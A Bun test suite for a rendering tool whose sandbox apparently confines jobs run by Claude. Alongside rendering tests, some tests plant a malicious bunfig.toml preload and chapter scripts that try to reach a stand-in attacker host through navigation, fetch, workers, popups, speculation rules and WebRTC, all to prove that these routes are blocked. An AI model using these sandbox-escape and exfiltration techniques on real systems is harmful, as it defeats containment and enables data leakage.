import { test, expect } from 'bun:test';
import { mkdtempSync, readdirSync, existsSync, statSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join, basename, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { openDb } from '../studio/db.js';
import { permissionSettings } from '../studio/claude-job.js';
import { serve } from '../studio/serve.js';
import { createEvents } from '../studio/events.js';
import { findBrowser, gpuArgs } from '../studio/browser.js';
import puppeteer from 'puppeteer-core';
import { isolatedEnv, tempDir, tempDefaultDb, captureHosts, expectPixelsMatch, slowTest } from './helpers.js';

// Every run gets a throwaway database and data root, so render.mjs's in-process server never opens the repo's.
// Each render.mjs run is a process with a Chrome of its own (nothing to share across processes), and most of its
// time goes on waiting for the page's network to go idle, so the tests up to the SIGTERM ones are test.concurrent,
// with at most RUNS_AT_ONCE runs going at a time. Every test keeps its own data, output folders and capture hosts.
// The SIGTERM tests, which time how fast things stop, run on their own afterwards.
const root = process.cwd(), T = { timeout: 300000 };
const defaultDbPath = tempDefaultDb();   // once per file: a private copy, examples are read from it, never written
const RUNS_AT_ONCE = 6;
let running = 0;
const waiting = [];
const spawnNow = async (argv, opts) => {
  const p = Bun.spawn(argv, { stdout: 'pipe', stderr: 'pipe', ...opts });
  const [out, err, code] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text(), p.exited]);
  return { out, err, code };
};
// A run that launches Chrome waits for a free slot first.
const spawn = async (argv, opts) => {
  if (running >= RUNS_AT_ONCE) await new Promise(r => waiting.push(r));
  running++;
  try { return await spawnNow(argv, opts); } finally { running--; waiting.shift()?.(); }
};
const run = (...a) => spawn(['bun', 'render.mjs', ...a], { env: isolatedEnv() });
// An MP4's video frame count and each stream's length, from ffprobe.
const probe = file => {
  const r = Bun.spawnSync(['ffprobe', '-v', 'quiet', '-count_frames', '-print_format', 'json', '-show_streams', file]);
  const streams = JSON.parse(r.stdout.toString()).streams, of = type => streams.find(st => st.codec_type === type);
  return { frames: +of('video').nb_read_frames, video: +of('video').duration, audio: +of('audio').duration };
};
// Exactly n frames at 24 fps, and the song cut to the same length.
const expectExactly = (file, n) => {
  const p = probe(file);
  expect(p.frames).toBe(n);
  expect(Math.abs(p.video - n / 24)).toBeLessThan(.01);
  expect(Math.abs(p.audio - n / 24)).toBeLessThan(.03);
};
// (Refused before any browser starts: no slot needed.)
const runSandboxed = (sandbox, ...a) => spawnNow(['bun', 'render.mjs', ...a], { env: isolatedEnv(undefined, { STUDIO_SANDBOX: sandbox }) });

// A studio job as Claude's Bash tool sees it: a job in a throwaway database, its work folder holding the original's
// files, and STUDIO_SANDBOX set to that folder.
function sandboxJob() {
  const data = tempDir(), db = openDb(join(data, 'user.db'), { defaultPath: defaultDbPath });
  const jid = db.addJob({ kind: 'chapter', versionId: 'original', params: { chapter: 1 } }), dir = join(data, '.studio/work', String(jid));
  for (const f of db.listFiles('original')) {
    mkdirSync(dirname(join(dir, f.path)), { recursive: true });
    writeFileSync(join(dir, f.path), db.getFile('original', f.path).content);
  }
  db.close();
  return { data, jid, dir, env: isolatedEnv(data, { STUDIO_SANDBOX: dir }) };
}

slowTest.concurrent('check passes for the original and writes a sheet', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'chk-'));
  const r = await run('--check=5,40,150', `--out=${join(dir, 'sheet.jpg')}`);
  expect(r.out).toContain('CHECK OK');
  expect(r.code).toBe(0);
  expect(statSync(join(dir, 'sheet.jpg')).size).toBeGreaterThan(10000);
}, T);

slowTest.concurrent('check fails for a missing version', async () => {
  const r = await run('--check=5', '--v=does-not-exist');
  expect(r.code).toBe(1);
  expect(r.err).toContain('CHECK FAILED');
  expect(r.err).toContain('no such version');
}, T);

slowTest.concurrent('check fails cleanly instead of crashing when the page cannot be reached', async () => {
  const r = await run('--check=5', '--base=http://127.0.0.1:1');
  expect(r.code).toBe(1);
  expect(r.err).toContain('CHECK FAILED');
}, T);

slowTest.concurrent('check fails when the bundled fonts fail to load', async () => {
  const r = await spawn(['bun', 'render.mjs', '--check=load'], { env: isolatedEnv(undefined, { STUDIO_TEST_BREAK_FONTS: '1' }) });
  expect(r.code).toBe(1);
  expect(r.err).toContain('CHECK FAILED');
  expect(r.err).toContain('font not loaded');
}, T);

slowTest.concurrent('renders a short range of frames and encodes it', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'frames-'));
  const f = await run('--frames=40:40.5', '--workers=2', `--frames-dir=${dir}`);
  expect(f.out).toContain('12 frames to render (0 already done)');
  expect(readdirSync(dir).filter(n => n.endsWith('.jpg'))).toHaveLength(12);
  const again = await run('--frames=40:40.5', '--workers=2', `--frames-dir=${dir}`);
  expect(again.out).toContain('0 frames to render (12 already done)');
  const out = join(dir, 'clip.mp4');
  const e = await run('--encode', `--frames-dir=${dir}`, `--out=${out}`, '--start=960');
  expect(e.code).toBe(0);
  expectExactly(out, 12);
}, T);

slowTest.concurrent('a clip is exactly its frames, with the song cut to match', async () => {
  const out = join(mkdtempSync(join(tmpdir(), 'clip-')), 'clip.mp4');
  const c = await run('--clip=40:40.25', `--out=${out}`);
  expect(c.code).toBe(0);
  expectExactly(out, 6);
}, T);

// The Original's stills as render.mjs paints them, locked down and with its guard gesture: one run, compared by the
// two tests below (the gesture's, at 5, 40 and 90 s; the lockdown's, at all four).
let lockedStills = null;
const stillsAsRendered = () => lockedStills ??= (async () => {
  const dir = mkdtempSync(join(tmpdir(), 'locked-')), times = [5, 40, 90, 150];
  return { dir, times, ...await run(`--stills=${times.join(',')}`, `--out=${dir}`) };
})();

slowTest.concurrent('the synthetic key press that arms the navigation guard does not perturb the picture', async () => {
  // p5 tracks mouse state and would fire mousePressed() from a synthetic click; nothing today reads that, but a
  // keyboard gesture (see render.mjs) was chosen specifically so this holds regardless of what a chapter does.
  // Proof: render the same stills with and without the gesture (RENDER_TEST_NO_GESTURE is a test-only escape
  // hatch) and diff the decoded pixels (see expectPixelsMatch in test/helpers.js for why not raw bytes).
  const unarmed = mkdtempSync(join(tmpdir(), 'gesture-off-'));
  const [withGesture, withoutGesture] = await Promise.all([stillsAsRendered(),
    spawn(['bun', 'render.mjs', '--stills=5,40,90', `--out=${unarmed}`], { env: isolatedEnv(undefined, { RENDER_TEST_NO_GESTURE: '1' }) })]);
  const armed = withGesture.dir;
  expect(withGesture.code).toBe(0);
  expect(withoutGesture.code).toBe(0);
  for (const f of ['t5_00.png', 't40_00.png', 't90_00.png']) {
    expect(statSync(join(armed, f)).size).toBeGreaterThan(1000);
    const [a, b] = await Promise.all([Bun.file(join(armed, f)).arrayBuffer(), Bun.file(join(unarmed, f)).arrayBuffer()]);
    expectPixelsMatch(Buffer.from(a), Buffer.from(b), f);
  }
}, T);

slowTest.concurrent('the network lockdown leaves the picture as it was: stills match the same frames painted without it', async () => {
  // render.mjs's browser (dead proxy, WebRTC policy, resolver rules, request interception, the guard gesture) against a
  // browser launched with the GPU flags alone, both painting the Original from the same server code. If anything in
  // the lockdown kept something the picture needs from loading (the bundled fonts, above all), the typefaces would differ.
  // Pixels are compared with a small tolerance, not byte for byte — see expectPixelsMatch in test/helpers.js for why.
  const r = await stillsAsRendered(), { dir, times } = r;
  expect(r.code).toBe(0);
  const db = openDb(join(tempDir(), 'user.db'), { defaultPath: defaultDbPath });
  const srv = serve({ db, root, data: tempDir(), token: 't', events: createEvents(), port: 0 });
  const plain = await puppeteer.launch({ executablePath: findBrowser(), headless: true, args: gpuArgs() });
  try {
    const page = await plain.newPage();
    await page.goto(`${srv.url}/studio.html?render&v=original`);
    await page.waitForFunction('window.ready === true', { timeout: 60000 });
    for (const t of times) {
      const url = await page.evaluate(t => window.renderAt(t, 'image/png'), t);
      const locked = Buffer.from(await Bun.file(join(dir, `t${t.toFixed(2).replace('.', '_')}.png`)).arrayBuffer());
      expect(locked.length).toBeGreaterThan(1000);
      expectPixelsMatch(Buffer.from(url.slice(url.indexOf(',') + 1), 'base64'), locked, `t=${t}`);
    }
  } finally {
    await plain.close();
    srv.stop();
    db.close();
  }
}, T);

test.concurrent('sandbox: an --out outside STUDIO_SANDBOX is refused', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  const outside = join(tmpdir(), 'outside-sheet.jpg');
  const r = await runSandboxed(sandbox, `--work=${basename(sandbox)}`, '--sheet=5', `--out=${outside}`);
  expect(r.code).toBe(2);
  expect(r.err).toContain('sandbox');
  expect(existsSync(outside)).toBe(false);
});

test.concurrent('sandbox: --chrome is refused', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  const r = await runSandboxed(sandbox, `--work=${basename(sandbox)}`, '--sheet=5', `--out=${join(sandbox, 'sheet.jpg')}`, '--chrome=/bin/echo');
  expect(r.code).toBe(2);
  expect(r.err).toContain('sandbox');
});

test.concurrent('sandbox: a non-localhost --base is refused', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  const r = await runSandboxed(sandbox, `--work=${basename(sandbox)}`, '--check=5', '--base=https://example.com');
  expect(r.code).toBe(2);
  expect(r.err).toContain('sandbox');
});

test.concurrent('sandbox: a --work that does not match the sandboxed job is refused', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  const r = await runSandboxed(sandbox, '--work=some-other-job', '--sheet=5', `--out=${join(sandbox, 'sheet.jpg')}`);
  expect(r.code).toBe(2);
  expect(r.err).toContain('sandbox');
});

test.concurrent('sandbox: a duplicated --work is refused even if the last value matches', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  const r = await runSandboxed(sandbox, '--work=some-other-job', '--sheet=5', `--out=${join(sandbox, 'sheet.jpg')}`, `--work=${basename(sandbox)}`);
  expect(r.code).toBe(2);
  expect(r.err).toContain('sandbox');
  expect(existsSync(join(sandbox, 'sheet.jpg'))).toBe(false);
});

test.concurrent('sandbox: --sheet, --poster and --stills need an --out', async () => {
  const sandbox = mkdtempSync(join(tmpdir(), 'sbx-'));
  for (const mode of ['--sheet=5', '--poster=5', '--stills=5']) {
    const r = await runSandboxed(sandbox, `--work=${basename(sandbox)}`, mode);
    expect(r.code).toBe(2);
    expect(r.err).toContain('--out is required');
  }
});

slowTest.concurrent('sandbox: CHROME_PATH is ignored', async () => {
  const { jid, dir, env } = sandboxJob();
  const r = await spawn(['bun', 'render.mjs', `--work=${jid}`, '--sheet=5', `--out=${join(dir, 'sheet.jpg')}`], { env: { ...env, CHROME_PATH: '/usr/bin/false' } });
  expect(r.err).toBe('');
  expect(r.code).toBe(0);
  expect(statSync(join(dir, 'sheet.jpg')).size).toBeGreaterThan(10000);
}, T);

slowTest.concurrent("sandbox: the command Claude may run ignores a bunfig.toml and .env planted in its work folder", async () => {
  const { data, jid, dir, env } = sandboxJob(), marker = join(data, 'PWNED_BY_PRELOAD.txt');
  writeFileSync(join(dir, 'p.js'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'pwned');`);
  writeFileSync(join(dir, 'bunfig.toml'), 'preload = ["./p.js"]\n');
  writeFileSync(join(dir, '.env'), 'CHROME_PATH=/usr/bin/false\n');
  writeFileSync(join(dir, 'noop.js'), '');
  // Without the flags, Bun would run the preload from the work folder before any script.
  Bun.spawnSync(['bun', join(dir, 'noop.js')], { cwd: dir, env });
  expect(existsSync(marker)).toBe(true);
  rmSync(marker);

  const rule = permissionSettings({ root, jobId: jid, dir }).permissions.allow.find(r => r.startsWith('Bash('));
  const command = rule.slice('Bash('.length, -' *)'.length).split(' ');
  const r = await spawn([...command, '--sheet=5', '--out=sheet.jpg'], { cwd: dir, env });
  expect(existsSync(marker)).toBe(false);
  expect(r.err).toBe('');
  expect(r.code).toBe(0);
  expect(statSync(join(dir, 'sheet.jpg')).size).toBeGreaterThan(10000);
}, T);

slowTest.concurrent('frames: a chapter that fails to load fails the render instead of painting it as missing', async () => {
  const data = tempDir(), db = openDb(join(data, 'user.db')), frames = join(data, 'frames');
  db.createVersion({ id: 'broken' });
  db.writeFiles('broken', [{ path: 'ch/c01.js', content: "throw new Error('boom');" }], { source: 'manual' });
  db.close();
  const r = await spawn(['bun', 'render.mjs', '--v=broken', '--frames=1:1.5', '--workers=1', `--frames-dir=${frames}`], { env: isolatedEnv(data) });
  expect(r.code).not.toBe(0);
  expect(r.err).toContain('boom');
  expect(existsSync(frames) ? readdirSync(frames).filter(n => n.endsWith('.jpg')) : []).toEqual([]);
}, T);

slowTest.concurrent('a chapter cannot navigate away, fetch out, or pop a window to an external host', async () => {
  // A stand-in "external host": a second loopback port, so it's a different origin than the renderer's own
  // w0.localhost, with nothing else pointing at it. (Not 127.0.0.2: macOS doesn't alias the whole 127.0.0.0/8 like
  // Linux does, so only 127.0.0.1 is bindable without extra setup — a different port is a different origin too.)
  const hits = [];
  const capture = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch(req) { hits.push(req.url); return new Response('should never be reached'); } });
  const evil = `http://127.0.0.1:${capture.port}`;
  const data = tempDir(), db = openDb(join(data, 'user.db'));
  db.createVersion({ id: 'escapee' });
  db.writeFiles('escapee', [{ path: 'ch/c01.js', content: [
    `location.href = ${JSON.stringify(evil + '/nav?x=1')};`,
    `fetch(${JSON.stringify(evil + '/fetch')}).catch(() => {});`,
    `window.open(${JSON.stringify(evil + '/popup')});`,
  ].join('\n') }], { source: 'manual' });
  db.close();
  const out = mkdtempSync(join(tmpdir(), 'sheet-'));
  try {
    // --sheet, not --check: the blocked fetch above still logs a (harmless, pre-existing) CSP violation to the
    // page console, which --check's stricter error-collecting would flag as a failure even though nothing leaked.
    const r = await spawn(['bun', 'render.mjs', '--v=escapee', '--sheet=1', `--out=${join(out, 'sheet.jpg')}`], { env: isolatedEnv(data) });
    expect(r.err).toBe('');
    expect(r.code).toBe(0);
    expect(statSync(join(out, 'sheet.jpg')).size).toBeGreaterThan(1000);
  } finally {
    capture.stop(true);
  }
  expect(hits).toEqual([]);
}, T);

slowTest.concurrent('a chapter cannot reach an external host through a service worker, a shared worker or a worker', async () => {
  // Workers are separate targets: their requests never pass through render.mjs's page-level interception, and a
  // worker script served from /v/ carries no CSP of its own. So each variant below re-runs this very chapter file
  // as a worker, which then fetches the capture server. That includes registering a service worker from a
  // same-origin iframe of a file served without any CSP (/src/lyrics.js), where the page's own worker-src can't
  // reach. The busy-wait at the end holds the page for a moment so the workers get their chance before the render
  // finishes and the browser closes.
  const hits = [];
  const capture = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch(req) { hits.push(req.url); return new Response('should never be reached'); } });
  const evil = `http://127.0.0.1:${capture.port}`;
  const data = tempDir(), db = openDb(join(data, 'user.db'));
  db.createVersion({ id: 'worker-escapee' });
  db.writeFiles('worker-escapee', [{ path: 'ch/c01.js', content: [
    `if (typeof document === 'undefined') {`,
    `  const kind = typeof ServiceWorkerGlobalScope !== 'undefined' ? 'service-worker' : typeof SharedWorkerGlobalScope !== 'undefined' ? 'shared-worker' : 'worker';`,
    `  fetch(${JSON.stringify(evil)} + '/' + kind + location.search).catch(() => {});`,
    `} else {`,
    `  const src = document.currentScript.src;`,
    `  navigator.serviceWorker.register(src + '?from=page').catch(() => {});`,
    `  try { new SharedWorker(src + '?from=page'); } catch {}`,
    `  try { new Worker(src + '?from=page'); } catch {}`,
    `  const frame = document.createElement('iframe');`,
    `  frame.src = '/src/lyrics.js';`,
    `  frame.onload = () => { try { frame.contentWindow.navigator.serviceWorker.register(src + '?from=iframe').catch(() => {}); } catch {} };`,
    `  document.body.append(frame);`,
    `  for (const until = Date.now() + 1500; Date.now() < until;) {}`,
    `}`,
  ].join('\n') }], { source: 'manual' });
  db.close();
  const out = mkdtempSync(join(tmpdir(), 'sheet-'));
  try {
    const r = await spawn(['bun', 'render.mjs', '--v=worker-escapee', '--sheet=1', `--out=${join(out, 'sheet.jpg')}`], { env: isolatedEnv(data) });
    expect(r.err).toBe('');
    expect(r.code).toBe(0);
    expect(statSync(join(out, 'sheet.jpg')).size).toBeGreaterThan(1000);
    await Bun.sleep(1000);   // a request still in flight when the browser closed would land about now
  } finally {
    capture.stop(true);
  }
  expect(hits).toEqual([]);
}, T);

slowTest.concurrent('a chapter cannot reach another host through a popup, speculation rules, a link hint or WebRTC', async () => {
  // Each attempt aims at its own stand-in host (see captureHosts), so a hit names the attempt that got through:
  // (a) document.open with three arguments, which is window.open by another name; (b) a target=_blank link, clicked;
  // (c) a same-origin popup of a page served without studio.html's policy, then that window's fetch, Image and
  // Worker; (d) speculation rules (prefetch and prerender) and <link rel=prerender>; (e) a preconnect, a TCP
  // connection with no request; (f) WebRTC TURN over TCP (plus TURN over UDP and STUN, to the UDP stand-in), from the
  // page itself and from a fresh about:blank realm, where anything the page's own window lacks is back.
  const cap = await captureHosts(['a', 'b', 'c', 'd', 'd-link', 'e', 'f', 'f-realm']);
  const E = Object.fromEntries(['a', 'b', 'c', 'd', 'd-link', 'e'].map(k => [k, cap.url(k)]));
  const ice = name => [`turn:127.0.0.1:${cap.port(name)}?transport=tcp`, `turn:127.0.0.1:${cap.port('udp')}?transport=udp`, `stun:127.0.0.1:${cap.port('udp')}`];
  const data = tempDir(), db = openDb(join(data, 'user.db'));
  db.createVersion({ id: 'escape-routes' });
  db.writeFiles('escape-routes', [{ path: 'ch/c01.js', content: `
const E = ${JSON.stringify(E)};
if (typeof document === 'undefined') fetch(E.c + '/c-worker').catch(() => {});   // (c), as the worker
else {
  const self = document.currentScript.src, attempt = f => { try { f(); } catch {} };
  const link = (rel, href) => { const l = document.createElement('link'); l.rel = rel; l.href = href; document.head.append(l); };
  const turn = (Ctor, urls) => {
    const pc = new Ctor({ iceServers: [{ urls, username: 'secret', credential: 'secret' }] });
    pc.createDataChannel('x');
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
  };
  attempt(() => document.open(E.a + '/a', 'a', ''));
  for (const rel of ['', 'noopener']) attempt(() => {
    const l = document.createElement('a'); l.href = E.b + '/b-' + rel; l.target = '_blank'; l.rel = rel; document.body.append(l); l.click();
  });
  for (const [i, path] of ['/api/versions/escape-routes', '/src/lyrics.js'].entries()) attempt(() => {
    const w = document.open(path, 'c' + i, '');
    const reach = () => {
      attempt(() => w.fetch(E.c + '/c-fetch').catch(() => {}));
      attempt(() => { new w.Image().src = E.c + '/c-img'; });
      attempt(() => new w.Worker(self));
    };
    for (const ms of [0, 100, 300, 600]) setTimeout(reach, ms);
  });
  attempt(() => {
    const s = document.createElement('script'); s.type = 'speculationrules';
    // Over https too (Chrome prefetches another site only over https), and same-site (another port on w0.localhost).
    const at = path => [E.d, E.d.replace('http:', 'https:'), E.d.replace('127.0.0.1', 'w0.localhost')].map(u => u + path);
    s.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: at('/d-prefetch') }], prerender: [{ source: 'list', urls: at('/d-prerender') }] });
    document.head.append(s);
  });
  attempt(() => link('prerender', E['d-link'] + '/d-link-prerender'));
  attempt(() => link('preconnect', E.e));
  attempt(() => turn(RTCPeerConnection, ${JSON.stringify(ice('f'))}));
  attempt(() => turn(document.body.appendChild(document.createElement('iframe')).contentWindow.RTCPeerConnection, ${JSON.stringify(ice('f-realm'))}));
}
` }], { source: 'manual' });
  db.close();
  const out = mkdtempSync(join(tmpdir(), 'sheet-'));
  try {
    const r = await spawn(['bun', 'render.mjs', '--v=escape-routes', '--sheet=1,2,3', `--out=${join(out, 'sheet.jpg')}`], { env: isolatedEnv(data) });
    expect(r.err).toBe('');
    expect(r.code).toBe(0);
    expect(statSync(join(out, 'sheet.jpg')).size).toBeGreaterThan(1000);
    await Bun.sleep(1000);   // anything still in flight when the browser closed would land about now
  } finally {
    cap.stop();
  }
  expect(cap.hits).toEqual({});
}, T);

slowTest.concurrent('without USER_DB, the in-process server reads user.db in STUDIO_DATA, or a not-yet-migrated studio.db there', async () => {
  const chapter = "chapter('one', 0, 23, [[0, t => paint(rectPts(0, 0, W, H), { wash: PAL.sky, ink: null })]]);";
  await Promise.all(['user.db', 'studio.db'].map(async name => {
    const data = tempDir(), db = openDb(join(data, name));
    db.createVersion({ id: 'in-data-folder' });
    db.writeFiles('in-data-folder', [{ path: 'ch/c01.js', content: chapter }], { source: 'manual' });
    db.close();
    const { USER_DB, STUDIO_DB, ...env } = isolatedEnv(data);
    const r = await spawn(['bun', 'render.mjs', '--v=in-data-folder', '--check=5'], { env });
    expect([name, r.out]).toEqual([name, expect.stringContaining('CHECK OK')]);
    expect([name, r.code]).toEqual([name, 0]);
    expect(readdirSync(data).filter(n => n.endsWith('.db'))).toEqual([name]);   // and made no other database there
  }));
}, T);

slowTest.concurrent('a data: URI image still renders under request interception', async () => {
  // Chrome reports a data: URI as a "request" to Fetch-domain interception (so it does reach the handler below),
  // but it never actually goes over the network — abort()/continue() has no effect on it either way, and it loads
  // regardless. Verified directly against a bare interception handler before writing this; this test proves it
  // holds through the real pipeline, including the origin allow-list (a data: URI's origin is the string "null").
  const data = tempDir(), db = openDb(join(data, 'user.db'));
  db.createVersion({ id: 'datauri' });
  db.writeFiles('datauri', [{ path: 'ch/c01.js', content: [
    "const img = new Image();",
    "img.onload = () => console.warn('DATA URI IMAGE LOADED ' + img.naturalWidth + 'x' + img.naturalHeight);",
    "img.onerror = () => console.error('DATA URI IMAGE FAILED TO LOAD');",
    "img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';",
    "document.body.append(img);",
  ].join('\n') }], { source: 'manual' });
  db.close();
  const r = await spawn(['bun', 'render.mjs', '--v=datauri', '--check=load'], { env: isolatedEnv(data) });
  expect(r.out).toContain('DATA URI IMAGE LOADED 1x1');
  expect(r.out).toContain('CHECK OK');
  expect(r.err).toBe('');
  expect(r.code).toBe(0);
}, T);

// The direct children of a process (pgrep exits 1 when there are none).
const children = pid => (Bun.spawnSync(['pgrep', '-P', String(pid)]).stdout.toString().match(/\d+/g) || []).map(Number);
const gone = async (pid, ms = 5000) => {
  for (const t0 = Date.now(); Date.now() - t0 < ms; await Bun.sleep(50)) { try { process.kill(pid, 0); } catch { return true; } }
  return false;
};
async function startUntil(argv, env, line) {
  const p = Bun.spawn(argv, { env, stdout: 'pipe', stderr: 'pipe' }), reader = p.stdout.getReader(), dec = new TextDecoder();
  let out = '';
  while (!out.includes(line)) { const { value, done } = await reader.read(); if (done) throw new Error('exited early: ' + out); out += dec.decode(value); }
  reader.releaseLock();
  return p;
}

slowTest('SIGTERM during encoding stops ffmpeg too', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'enc-'));
  // A minute of 1080p frames: encoding them takes ffmpeg several seconds even on a fast machine.
  Bun.spawnSync(['ffmpeg', '-loglevel', 'error', '-f', 'lavfi', '-i', 'testsrc2=size=1920x1080:rate=24', '-frames:v', '1440', '-q:v', '31',
    '-start_number', '0', join(dir, 'f%05d.jpg')]);
  const p = await startUntil(['bun', 'render.mjs', '--encode', `--frames-dir=${dir}`, `--out=${join(dir, 'out.mp4')}`], isolatedEnv(), 'encoding');
  let kids = [];
  for (let i = 0; i < 50 && !kids.length; i++) { kids = children(p.pid); if (!kids.length) await Bun.sleep(100); }
  expect(kids).toHaveLength(1);
  p.kill('SIGTERM');
  expect(await p.exited).not.toBe(0);
  expect(await gone(kids[0], 1500)).toBe(true);
}, T);

slowTest('SIGTERM while painting frames closes the browser and exits', async () => {
  const frames = mkdtempSync(join(tmpdir(), 'frames-'));
  const p = await startUntil(['bun', 'render.mjs', '--frames=0:156.6', '--workers=1', `--frames-dir=${frames}`], isolatedEnv(), 'frames to render');
  const kids = children(p.pid);
  expect(kids.length).toBeGreaterThan(0);
  p.kill('SIGTERM');
  expect(await p.exited).not.toBe(0);
  for (const pid of kids) expect(await gone(pid)).toBe(true);
}, T);
